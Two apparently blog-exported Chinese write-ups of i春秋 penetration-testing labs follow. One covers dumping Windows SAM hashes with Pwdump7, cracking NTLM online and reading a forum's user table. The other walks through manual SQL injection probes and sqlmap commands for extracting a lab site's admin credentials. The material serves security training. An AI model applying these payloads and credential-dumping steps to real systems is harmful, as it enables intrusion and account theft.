<p>确认提权成功后，在本机上点击 <strong>开始 -&gt; 运行</strong>，输入 <a href="https://baike.baidu.com/item/mstsc"><code>mstsc</code></a>，远程计算机地址为 <code>172.16.12.2</code>（在实验场景拓扑图上可见）：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/mstsc.png" alt="mstsc"></p>
<p>正常情况下会弹出远程桌面，输入用户名 <code>ichunqiu</code> 与密码 <code>key</code>，即可成功登录远程服务器：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server.png" alt="login-server"></p>
<p>进入到远程主机桌面，此时可以通过 <a href="http://www.openwall.com/passwords/windows-pwdump">pwdump 工具</a> 获取管理员密码的哈希值，常见的 pwdump 工具有 Pwdump7、QuarksPwDump、Cain &amp; Abel 等。</p>
<blockquote>
<p>小贴士：<a href="https://en.wikipedia.org/wiki/Pwdump"><strong>pwdump</strong></a> 是一类能从 Windows <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">SAM（Security Account Manager）</a> 中读出本地用户 <a href="https://en.wikipedia.org/wiki/LAN_Manager#LM_hash_details">LM（LAN Manager）</a> 与 <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM（NT LAN Manager）</a> 密码哈希值的工具（注意必须在管理员权限下），其中 LM 与 NTLM 是 Windows 系统下的安全认证协议，并且 NTLM 是 LM 的演进版本，安全性更高。</p>
</blockquote>
<p>下面以 <a href="http://www.tarasco.org/security/pwdump_7/index.html"><strong>Pwdump7</strong></a> 为例进行演示，先将实验工具箱【提权工具】-&gt;【hash】-&gt;【Pwdump7】文件夹下的 <strong>Pwdump7.exe</strong> 与 <strong>libeay32.dll</strong> 两个文件通过菜刀上传至服务器 <code>C:\wmpub</code> 目录，再回到远程主机桌面点击【开始】 -&gt; 【我的电脑】，进入上传点打开 cmd.exe，直接输入 <code>pwdump7</code> 命令即可获得所有用户的密码哈希值，其中 <code>3C8D6C158F6FB3D1FDCFC2AFB2D1BE34</code> 是 LM 哈希，<code>594B9CD2577A5AC2BE0CA522D5EC6ACE</code> 是 NTLM 哈希：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/pwdump7.png" alt="pwdump7"></p>
<p> 最后，打开在线哈希值破解工具 <a href="http://www.objectif-securite.ch/">Objectif Sécurité </a>，在主页点击 <strong>OPHCRACK</strong> 选项卡，将 NTLM 哈希 <code>594B9CD2577A5AC2BE0CA522D5EC6ACE</code> 填入第一个文本框，点击 <strong>GO</strong> 解密后，即得管理员系统密码的明文 <code>88hvpebv</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/objectif.png" alt="objectif"></p>
<h1 id="0x05-文末彩蛋"><a href="#0x05-文末彩蛋" class="headerlink" title="0x05 文末彩蛋"></a>0x05 文末彩蛋</h1><p>当我们拥有了服务器管理员账号 <code>Administrator</code> 与密码 <code>88hvpebv</code> 后，可以打开上帝视角来回顾一下靶机渗透环境，对之前渗透过程中遇到的有趣现象有更深入的理解。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/login-server-admin.png" alt="login-server-admin"></p>
<h2 id="直接查看-SSMS-账户的密码？"><a href="#直接查看-SSMS-账户的密码？" class="headerlink" title="直接查看 SSMS 账户的密码？"></a>直接查看 SSMS 账户的密码？</h2><p>进入到远程服务器的管理员桌面后，发现了数据库集成环境 <strong>SQL Server Management Studio</strong>，心想是否能直接通过该 IDE 查看到账户 <code>sa</code> 的密码呢？于是打开 SSMS，点击 <strong>连接(C)</strong> 进入数据库服务器，在 <strong>ADMIN-508BF95B0 -&gt; 安全性 -&gt; 登录名</strong> 路径下找到账户 <code>sa</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-user.png" alt="ssms-user"></p>
<p>双击 <code>sa</code> 账户，发现在登录属性中只能看到其密码的 <code>*</code> 号隐藏值：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/ssms-sa.png" alt="ssms-sa"></p>
<p>搜索了许多相关资料后才知道，<strong>只能通过 SSMS 修改密码，但不能查看原密码</strong>，否则安全性怎么保证呢？想了想确实也是，因此账户 <code>sa</code> 的密码除了在主站数据库配置文件中作为敏感信息泄露外，目前暂无他法，若读者们找到了其他途径获得密码，还请分享交流。</p>
<h2 id="「linhai」的论坛后台管理密码？"><a href="#「linhai」的论坛后台管理密码？" class="headerlink" title="「linhai」的论坛后台管理密码？"></a>「linhai」的论坛后台管理密码？</h2><p>通过菜刀在主站 <code>/bbs/Data/</code> 目录下发现了数据库 <code>dtxy.mdb</code> 的备份文件 <code>dtxy.asp</code>，与上文类似，将其下载至桌面，并改名为 <code>dtxy.mdb</code>，点击右键查看其属性，<strong>如果发现其大小为 0 字节，则说明下载失败。</strong>此时若用明小子注入工具打开，则会<strong>弹出输入数据库密码的提示，实际上是由于识别了无效的数据库文件</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-error.png" alt="dtxy-error"></p>
<p>笔者在实验过程中时而下载成功，时而失败，原因至今不明。经过反复试验，这里提供两种解决方法，供大家参考：</p>
<h3 id="将-dtxy-asp-复制到其他文件夹再下载"><a href="#将-dtxy-asp-复制到其他文件夹再下载" class="headerlink" title="将 dtxy.asp 复制到其他文件夹再下载"></a>将 dtxy.asp 复制到其他文件夹再下载</h3><p>笔者尝试将 <code>dtxy.asp</code> 复制到其他文件夹中（如 <code>/bbs/Board/</code>），下载后发现其大小终于不为 0 字节，说明下载成功。</p>
<p>更有意思的是，将其他文件夹的文件（如 <code>/bbs/Board/Board.asp</code>）复制到  <code>/bbs/Data/</code>  中，也能正常下载。</p>
<p>因此，结论是<strong>原本就在 <code>/bbs/Data/</code> 目录下的文件不能正常下载，至少刚开始连上菜刀的时候不行。</strong>后面不知过了多久，经过了什么操作，又能够正常下载了。这一神奇的现象笔者至今无法理解，请有经验的前辈多多指点。</p>
<h3 id="直接将明小子注入工具上传至服务器"><a href="#直接将明小子注入工具上传至服务器" class="headerlink" title="直接将明小子注入工具上传至服务器"></a>直接将明小子注入工具上传至服务器</h3><p>另一种方法，是在成功提权的情况下，直接将明小子注入工具通过菜刀上传至服务器，即可在远程服务器内利用明小子查看任意数据库文件，避免了下载文件可能出错的问题。</p>
<h3 id="获取论坛用户密码"><a href="#获取论坛用户密码" class="headerlink" title="获取论坛用户密码"></a>获取论坛用户密码</h3><p>通过以上两种方法，即可成功查看数据库 <code>dtxy.asp</code> 中的内容。双击 <code>LeadBBS_User</code> 表，即可看到论坛所有用户的相关信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-user.png" alt="dtxy-user"></p>
<p>其中，用户 <code>linhai</code> 的密码哈希值为 <code>e10adc3949ba59abbe56e057f20f883e</code>，解密后得到密码明文 <code>123456</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-linhai-password.png" alt="dtxy-linhai-password"></p>
<p>还可验证管理员用户 <code>Admin</code> 的密码哈希值 <code>21232f297a57a5a743894a0e4a801fc3</code>，解密后确实为 <code>admin</code>，与之前的猜测一致：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-comprehensive-website-pentest/dtxy-admin-password.png" alt="dtxy-admin-password"></p>
<p>事实上，整个 Web 应用程序<strong>最有价值</strong>的就是这张表，里面包含所有用户的隐私信息，不仅能实现任意用户登录，而且还能通过撞库威胁其他 Web 应用上的账户，甚至利用钓鱼或社工手段骗取钱财。<strong>因此，该表通常也是黑产的终极目标，也是互联网企业最核心的用户资产，其重要性不言而喻。</strong></p>
<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p> 本篇 writeup 是 <strong>i春秋「渗透测试入门」系列实验</strong>的最后一作，在前篇 writeup <a href="https://ciphersaw.github.io/2018/03/20/%E3%80%90i%E6%98%A5%E7%A7%8B%E3%80%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8%20%E2%80%94%E2%80%94%20%E6%88%91%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E8%AF%B7%E4%B8%8D%E8%A6%81%E6%AC%BA%E8%B4%9F%E6%88%91/">【i春秋】渗透测试入门 —— 我很简单，请不要欺负我</a> 的基础上，加强巩固了渗透测试过程中信息收集、社工运用、SQL 注入、上传图片木马、获取 webshell、权限提升、获取系统用户密码等技巧的使用。</p>
<p>笔者水平有限，希望自己的一点心得体会有助于各位读者加深对渗透测试的理解，在动手实践之后能更熟练地掌握渗透工具。最后向以下两篇参考 writeup 的作者致谢，欢迎各位指出不足之处，分享独特思路。</p>
<blockquote>
<p><a href="https://bbs.ichunqiu.com/thread-1821-1-1.html">02-在线挑战详细攻略-《网站综合渗透实验》</a><br><a href="https://www.cnblogs.com/renzongxian/p/4957762.html">ichunqiu在线挑战–网站综合渗透实验 writeup</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Pentest</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
        <tag>Web</tag>
        <tag>Crypto</tag>
        <tag>i春秋</tag>
        <tag>Pentest</tag>
        <tag>Exploit</tag>
        <tag>CMS</tag>
        <tag>SQLi</tag>
        <tag>Trojan</tag>
        <tag>Vulnerability</tag>
        <tag>Social Engineering</tag>
        <tag>ASP</tag>
        <tag>Database</tag>
        <tag>Privilege</tag>
        <tag>CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>【i春秋】渗透测试入门 —— 我很简单，请不要欺负我</title>
    <url>/2018/03/20/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本实验是一次非常深入彻底的模拟渗透，虽然只针对一台服务器，但却经历了从最初的获取网站管理员账号密码，到获得网站的 webshell，最后到通过提权获得服务器系统最高权限的完整渗透过程。</p>
<p>从实验手册上给出的工具提示也能看出，本次渗透会用到目录扫描工具、注入工具、getshell 工具、提权工具等，可谓干货满满。若各位能亲自动手尝试所有能用到的工具，把整个渗透流程实现一遍，所有知识点都想明白，对初学者而言绝对有丰富的收获与极大的提升。</p>
<p>先简单介绍一下靶机环境：主站为<strong>魅力企业网站管理系统</strong>，采用 <strong>ASP</strong> 后端脚本语言，以及 <strong>Microsoft Office Access</strong> 数据库，该 CMS 年久失修，遍地漏洞，连官网也消失殆尽，不过还是能从各大软件平台下载到源码；服务器系统为 <strong>Windows Server 2003 Enterprise Edition</strong>，如果没打好补丁，此系统也是千疮百孔。总结一下，即典型的 <strong>Windows + IIS + ASP + Access</strong> 网站服务器出装。</p>
<ul>
<li>题目链接：<a href="https://www.ichunqiu.com/battalion?t=2&r=54399">https://www.ichunqiu.com/battalion?t=2&r=54399</a></li>
<li>解题链接：<a href="https://www.ichunqiu.com/vm/114/1">https://www.ichunqiu.com/vm/114/1</a></li>
</ul>
<span id="more"></span>

<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/guide.png" alt="guide"></p>
<p><em><strong>特此声明：由于本实验题目中包含 2 道选择题，因此不再沿用先前以题目名称作为章节标题的做法，而按照渗透流程的重要步骤来命名。</strong></em></p>
<h1 id="0x01-简单聊聊-WVS"><a href="#0x01-简单聊聊-WVS" class="headerlink" title="0x01 简单聊聊 WVS"></a>0x01 简单聊聊 WVS</h1><p>首先来看看第 1 道选择题：「WVS是什么工具？」，感觉问的很突兀，因为在本次渗透中 WVS 不是必要工具，也没有带来实质性的帮助，如果是我打开方式不对，还请指出。</p>
<p><a href="https://www.acunetix.com/"><strong>AWVS（Acunetix Web Vulnarability Scanner）</strong></a>，简称 WVS，是国外安全公司 Acunetix 的主打产品，一款自动化 Web 应用程序安全测试工具，用于快速扫描 Web 应用常见漏洞、爬取网站目录结构、提供多种实用工具等。虽然这是一款需要付费的商业软件，但在国内还是可以找到破解版的。</p>
<p>既然环境里提供了 WVS 工具，省去了我们下载安装的麻烦，那事不宜迟，先来体验一番。打开实验工具箱，在【目录扫描】文件夹中打开【AWVS】，即可看见我们的工具了：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/acunetix.png" alt="acunetix"></p>
<p>本节只演示 WVS 网站扫描的主要功能，包括目录扫描与漏洞扫描，其他功能请读者查看教程自行操作。点击 <strong>New Scan</strong>，在 <strong>Scan Type</strong> 栏的 <strong>Website URL</strong> 中填入目标站点 <code>http://www.test.ichunqiu/</code>，一直默认点击 <strong>Next</strong> 到最后的 <strong>Finish</strong> 栏，把 <strong>CASE insensitive crawling</strong> 前的钩去掉（因为服务器系统是 Windows，所有不需要大小写敏感，而 Linux 系统则需要），点击 <strong>Finish</strong> 完成。</p>
<p>等待一段时间，扫描完毕后，在界面中看到目录扫描与漏洞扫描的结果：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/acunetix-result.png" alt="acunetix-result"></p>
<p>不过可惜的是，后台登录页面都没被抓取出来，所以前面我才说没有提供实质性的帮助，此处权当 WVS 工具的使用练习。回到题目，有如下 4 个选项，从 WVS 的全称不难看出，把它作为 <strong>漏洞扫描工具</strong> 更为合适：</p>
<ul>
<li><input disabled="" type="checkbox"> 注入工具 </li>
<li><input checked="" disabled="" type="checkbox"> 漏洞扫描工具</li>
<li><input disabled="" type="checkbox"> 目录扫描工具</li>
<li><input disabled="" type="checkbox"> 暴力破解工具</li>
</ul>
<h1 id="0x02-SQL-注入获取管理员账号密码"><a href="#0x02-SQL-注入获取管理员账号密码" class="headerlink" title="0x02 SQL 注入获取管理员账号密码"></a>0x02 SQL 注入获取管理员账号密码</h1><p>聊完了 WVS，下面随着第 2 题「管理员的密码是什么？」正式进入渗透流程。首当其冲必然是魅力企业网站管理系统，不过网上有关该系统的漏洞报告很少，难以找到有效资料。此时不要着急，先回想一下前面几次渗透实验，获取管理员账号密码的方法不外乎<strong>敏感信息泄露、SQL 报错注入返回敏感信息、自动化注入工具直接读取数据库</strong>等，因此思路很明确：<strong>寻找网页中存在的注入点</strong>。</p>
<h2 id="SQL-注入点的类型"><a href="#SQL-注入点的类型" class="headerlink" title="SQL 注入点的类型"></a>SQL 注入点的类型</h2><p>在寻找 SQL 注入点之前，先科普一下注入点的类型。根据注入点输入数据的类型，可分为数字型注入与字符型注入，下面分别讲解这两种 SQL 注入的特点与区别。</p>
<blockquote>
<p>小贴士：SQL 语句的单行注释一般有 <code>--</code> 与 <code>#</code>，在验证 SQL 注入点时，要习惯性地在查询语句末尾加上注释符，并且注释符后最好加上一个空格，避免代码中后续 SQL 语句的干扰。</p>
</blockquote>
<h3 id="数字型-SQL-注入"><a href="#数字型-SQL-注入" class="headerlink" title="数字型 SQL 注入"></a>数字型 SQL 注入</h3><p>当注入点的输入参数为数字时，则称之为数字型 SQL 注入，例如 <code>id</code>、<code>age</code>、<code>order</code>、<code>page</code> 等参数。下面以主站中输入参数为数字型的页面 <code>http://www.test.ichunqiu/shownews.asp?id=1</code> 为例进行讲解。注意，在本次渗透环境中的 Access 数据库，只支持 <code>#</code> 注释符，读者可自行验证。</p>
<p>要判断 <code>ID=1</code> 是否为数字型 SQL 注入点，一般通过以下三步：</p>
<p><strong>（1）<code>http://www.test.ichunqiu/shownews.asp?id=1&#39;# </code></strong></p>
<p>由于数字参数在后台 SQL 语句中不需要引号闭合，如果在数字后插入一个英文单引号 <code>&#39;</code>，会导致 SQL 语句闭合错误，页面出现异常。</p>
<p><strong>（2）<code>http://www.test.ichunqiu/shownews.asp?id=1 AND 1=1# </code></strong></p>
<p>SQL 语句中限制条件为 <code>WHERE id=1 AND 1=1# </code>，相当于 <code>WHERE id=1# </code>，此时页面应该显示正常，与原请求无任何差异。</p>
<p><strong>（3）<code>http://www.test.ichunqiu/shownews.asp?id=1 AND 1=2# </code></strong></p>
<p>SQL 语句中限制条件为 <code>WHERE id=1 AND 1=2# </code>，相当于 <code>WHERE 1=2# </code>，即限定条件恒为假，此时页面应该显示异常，查询不出任何内容。</p>
<p>因此，经过以上三个步骤，即可判断 <code>http://www.test.ichunqiu/shownews.asp?id=1</code> 存在数字型 SQL 注入。</p>
<h3 id="字符型-SQL-注入"><a href="#字符型-SQL-注入" class="headerlink" title="字符型 SQL 注入"></a>字符型 SQL 注入</h3><p>当注入点的输入参数为字符串时，则称之为数字型 SQL 注入，例如 <code>username</code>、<code>password</code>、<code>title</code>、<code>class</code> 等参数。下面以主站中输入参数为字符型的页面 <code>http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9</code> 为例进行讲解。</p>
<p>字符型与数字型 SQL 注入最大区别在于：<strong>数字型不需要引号闭合，而字符型需要</strong>。可见，字符型 SQL 注入最关键的是如何闭合 SQL 语句，代码中的 SQL 语句一般采用单引号，但也别忘了双引号的可能。</p>
<p>要判断 <code>Title=%B9%AB%CB%BE%BC%F2%BD%E9</code> 是否为字符型 SQL 注入点，一般通过以下两步：</p>
<p><strong>（1）<code>http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9&#39; AND 1=1# </code></strong></p>
<p>此时页面应该显示正常，但在测试中却出现异常，无法显示。</p>
<p><strong>（2）<code>http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9&#39; AND 1=2# </code></strong></p>
<p>此时页面应该显示异常，而测试的异常结果也与（1）中情况类似。</p>
<p>因此，经过以上两个步骤，即可判断 <code>http://www.test.ichunqiu/Aboutus.asp?Title=%B9%AB%CB%BE%BC%F2%BD%E9</code> 不存在字符型 SQL 注入。</p>
<p>至于不存在字符型 SQL 注入的原因，我们可以深入地分析一下。当 <code>Title=%B9%AB%CB%BE%BC%F2%BD%E9&#39; AND &#39;1&#39;=&#39;1</code> 或 <code>Title=%B9%AB%CB%BE%BC%F2%BD%E9&#39; AND &#39;1&#39;=&#39;1# </code> 时，页面是能够正常显示的，但 <code>Title=%B9%AB%CB%BE%BC%F2%BD%E9&#39; AND &#39;1&#39;=&#39;1&#39;# </code> 却不行，所以注释符 <code>#</code> 此处被过滤了。</p>
<p>小结一下以上手工查找 SQL 注入点的过程：</p>
<ul>
<li>是否能用注释符屏蔽后续 SQL 语句的干扰，是 SQL 注入点可用性的重要因素。</li>
<li>对于字符型 SQL 注入，还要注意引号的闭合。</li>
<li>上述网站中，数字型 SQL 注入没有过滤注释符 <code>#</code>，而字符型过滤了。</li>
</ul>
<p>最后粗略地统计网站中可用的数字型 SQL 注入点：</p>
<ul>
<li><code>http://www.test.ichunqiu/shownews.asp?id=1</code></li>
<li><code>http://www.test.ichunqiu/ProductShow.asp?ID=9</code></li>
<li><code>http://www.test.ichunqiu/DownloadShow.asp?ID=9</code></li>
<li><code>http://www.test.ichunqiu/CompHonorBig.asp?id=11</code></li>
<li><code>http://www.test.ichunqiu/CompVisualizeBig.asp?id=10</code></li>
</ul>
<h2 id="SQL-自动化注入"><a href="#SQL-自动化注入" class="headerlink" title="SQL 自动化注入"></a>SQL 自动化注入</h2><p>既然知道了注入点，下面正式开始通过注入来获取管理员账号密码。一般而言，使用 SQL 自动化注入工具是读取数据库信息最高效的方法，极少数特别的注入点需要临时定制 payload 进行手工注入，因此熟悉多种注入工具是一名合格渗透工程师的基本要求。</p>
<p>国内外的 SQL 自动化注入工具种类繁多，下面将以明小子（Domian）、穿山甲（Pangolin）、SQLMap 等工具为例进行演示。以上工具均在实验工具箱中的【注入工具】文件夹下。</p>
<blockquote>
<p>小贴士：一般的 SQL 自动化注入工具都带有判断注入点的功能，如果无法确定某参数是否存在注入，使用多款工具可以帮助你有效判断。</p>
</blockquote>
<h3 id="明小子（Domian）"><a href="#明小子（Domian）" class="headerlink" title="明小子（Domian）"></a>明小子（Domian）</h3><p><strong>明小子（Domian）</strong>是国内的一款 Web 应用程序综合渗透工具，有可视化图形界面，简单易用，在国内安全圈极负盛名。</p>
<p>打开工具，依次点击 <strong>SQL注入 -&gt; 批量扫描注入点 -&gt; 添加网址</strong>，填入主站 URL <code>http://www.test/ichunqiu/</code>，保存后点击 <strong>批量分析注入点</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/domain-info.png" alt="domain-info"></p>
<p>分析完毕后，右击其中一个注入点，点击 <strong>检测注入</strong>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/domain-injectable.png" alt="domain-injectable"></p>
<p>点击后会自动跳转至 <strong>SQL注入猜解检测</strong> 选项卡，不过这里不用检测出来的注入点，用我们手工发现的注入点，一来换换口味，二来获得点成就感，三来顺便验证手工发现的注入点是否可靠。下面将 <strong>注入点</strong> 改为 <code>http://www.test.ichunqiu/shownews.asp?id=1</code>，点击 <strong>开始检测</strong>，结果确实为一个可用注入点：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/domain-verification.png" alt="domain-verification"></p>
<p>确认可注入后，点击 <strong>猜解表名</strong> 后得到 4 张表，接着选中 <code>admin</code> 表，点击 <strong>猜解列名</strong> 后得到 3 个列名，在所有列名前打上钩，点解 <strong>猜解内容</strong> 后即可得到管理员的账号为 <code>admin</code>，16 位的密码哈希值为 <code>469e80d32c0559f8</code>。至此，通过明小子工具成功地获取了管理员的账号密码。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/domain-result.png" alt="domain-result"></p>
<h3 id="穿山甲（Pangolin）"><a href="#穿山甲（Pangolin）" class="headerlink" title="穿山甲（Pangolin）"></a>穿山甲（Pangolin）</h3><p><a href="https://baike.baidu.com/item/Pangolin"><strong>穿山甲（Pangolin）</strong></a>是深圳宇造诺赛科技有限公司（Nosec）多年前开发的一款 SQL 注入测试工具，如今时过境迁，官方网址不再提供工具的相关信息，而成为了<a href="http://www.baimaohui.net/">北京白帽汇科技有限公司</a>旗下的一款名为 <a href="https://nosec.org/">NOSEC</a> 的大数据安全协作平台。尽管穿山甲工具已停止开发维护，但对付传统数据库依然绰绰有余。</p>
<p>打开工具，在 <strong>URL</strong> 处填入注入点 <code>http://www.test.ichunqiu/shownews.asp?id=1</code>（注意：该工具不提供注入点扫描，只判断输入参数是否能作为注入点），点击 <strong>开始</strong> 箭头后，得到以下结果，说明注入点有效：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/pangolin-info.png" alt="pangolin-info"></p>
<p>切换到 <strong>Datas</strong> 选项卡，点击 <strong>Tables</strong> 后得到 4 张表，接着选中 <code>admin</code> 表（注意不是打钩），点击 <strong>Columns</strong> 后得到 4 个列名，此时才在 <code>admin</code> 前打钩，选中所有列，点击 <strong>Datas</strong> 后即可获得管理员账号密码。可见，穿山甲工具的使用流程与明小子非常类似。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/pangolin-result.png" alt="pangolin-result"></p>
<h3 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h3><p><a href="http://sqlmap.org/"><strong>SQLMap</strong></a> 是一款专注于自动化 SQL 注入检测的开源渗透工具，用 Python 脚本语言编写，能在装有 Python 2.6.x 与 Python 2.7.x 的系统上跨平台运行，支持对数十种常见数据库的检测，被誉为 SQL 注入领域的一大渗透神器。</p>
<p>由于 SQLMap 只支持命令行界面，其易用性不如前两者，但丝毫不影响其渗透威力，反而还拥有更高的检测效率与更广的检测范围。SQLMap 作为渗透工程师常用且必备的工具，应当重点掌握。下面将列出渗透过程中常用的命令及用法，建议同时参考<a href="https://github.com/sqlmapproject/sqlmap/wiki">官方文档</a>。</p>
<p>（1）<code>python sqlmap.py -h</code>：查询帮助手册。<br>（2）<code>python sqlmap.py -u &lt;URL&gt;</code>：检测该 URL 是否存在注入（末尾记得写上查询参数）。<br>（3）<code>python sqlmap.py -u &lt;URL&gt; --dbs</code>：查询所有数据库名。<br>（4）<code>python sqlmap.py -u &lt;URL&gt; --current-db</code>：查询当前数据库名。<br>（5）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; --tables</code>：查询某数据库中的所有表名。<br>（6）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; --columns</code>：查询某数据表中的所有列名。<br>（7）<code>python sqlmap.py -u &lt;URL&gt; -D &lt;database&gt; -T &lt;table&gt; -C &lt;column&gt; --dump</code>：查询某列中的所有数据。</p>
<p>以上是通过 GET 方式来检测注入点，并进行 SQL 注入读取数据库中数据的常规套路。<strong>注意一个特例：由于 Microsoft Access 数据库结构特殊，注入时不必通过（3）或（4）来查询数据库名，直接从（5）开始查询表名即可，<code>-D</code> 选项也可省去。</strong></p>
<blockquote>
<p>小贴士：为了避免在命令行界面输入中文进入【SQLMap】目录，因此使用前建议将【SQLMap】文件夹拷贝到 C 盘下。</p>
</blockquote>
<p>确保了命令行路径在【SQLMap】目录下后，根据（2）输入命令 <code>python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1</code> ，若询问「已确认 <code>id</code> 参数可注入，还需检测其他参数？」填 <code>N</code>，结果显示此为<strong>基于布尔的盲注（boolean-based blind）</strong>，并且返回了一些服务器相关信息，如：服务器操作系统为 <strong>Windows 2003 或 Windows XP</strong>，Web 应用程序采用了 <strong>APS.NET、Microsoft IIS 6.0、ASP</strong> 等建站技术，后端数据库数理系统为 <strong>Microsoft Access</strong>。以上对服务器相关信息的收集有助于后续更高效精准的渗透。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/sqlmap-info.png" alt="sqlmap-info"></p>
<p>知道了后端数据库是 Microsoft Access 后，可以跳过（3）或（4）直接进行（5），输入命令 <code>python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 --tables</code>，若询问「需要检测常用表名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。检测将近一半时，按 <code>Ctrl + C</code> 手动终止扫描，得到了包含 <code>admin</code> 表在内的 6 张表。<strong>注意：由于 SQLMap 扫描所用的字典范围更广，因此比起前两者能发现更多的数据表。</strong></p>
<blockquote>
<p>小贴士：由于扫描花时较长，当看到 <code>admin</code> 表出现时，可按 <code>Ctrl + C</code> 手动停止扫描。</p>
</blockquote>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/sqlmap-tables.png" alt="sqlmap-tables"></p>
<p>继续执行（6）中的命令，输入 <code>python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin --columns</code>，若询问「需要检测常用列名是否存在？」填 <code>Y</code>，询问「需要的线程数量？」填最大值 <code>10</code>。本次扫描不手动终止，等待其全部扫描完毕，得到了 <code>username</code> 与 <code>password</code> 等 6 个字段。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/sqlmap-columns.png" alt="sqlmap-columns"></p>
<p>最后执行（7）中的命令，输入 <code>python sqlmap.py -u http://www.test.ichunqiu/shownews.asp?id=1 -T admin -C username,password --dump</code>，等待其枚举完毕，若询问「需要临时保存结果的哈希值？」填 <code>N</code>，询问「需要用字典攻击来破解结果？」填 <code>n</code>，随即可看到管理员的账号密码等数据。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/ichunqiu-pentest-introduction-i-am-simple-dont-bully-me/sqlmap-result.png" alt="sqlmap-result"></p>
<h2 id="SQL-手工注入"><a href="#SQL-手工注入" class="headerlink" title="SQL 手工注入"></a>SQL 手工注入</h2><p>除了会使用 SQL 自动化注入工具，手工注入也应该是渗透工程师的基本技能之一。下面仍旧针对上述注入点，演示手工注入获取 Access 数据库内容的全过程。详细指导可参考：</p>
<blockquote>
<p><a href="http://blog.csdn.net/geecky/article/details/51297268">asp+access sql手工注入步骤</a><br><a href="https://www.cnblogs.com/0nth3way/articles/7123033.html">access手工注入</a></p>
</blockquote>
<h3 id="Step-1：猜解表名"><a href="#Step-1：猜解表名" class="headerlink" title="Step 1：猜解表名"></a>Step 1：猜解表名</h3><p>在火狐浏览器打开存在注入点的页面，将 URL 改为 <code>http://www.test.ichunqiu/shownews.asp?id=1 AND EXISTS(SELECT * FROM &lt;table&gt;)</code>，其中 <code>&lt;table&gt;</code> 为待猜解的表名，如果表名存在，页面将显示正常，否则出现异常。<strong>注意：如果管理员把库名、表名、列名更改得随机复杂，手工注入将变得非常困难。</strong></p>
